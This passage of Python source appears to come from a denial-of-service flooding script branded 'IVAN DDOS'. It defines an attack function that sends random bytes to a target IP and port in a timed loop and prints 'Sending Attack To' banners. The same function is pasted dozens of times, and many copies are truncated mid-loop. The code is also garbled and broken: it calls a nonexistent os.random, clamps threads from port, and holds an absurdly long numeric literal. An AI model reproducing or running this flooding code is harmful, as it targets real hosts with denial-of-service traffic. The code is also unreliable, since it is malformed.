        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
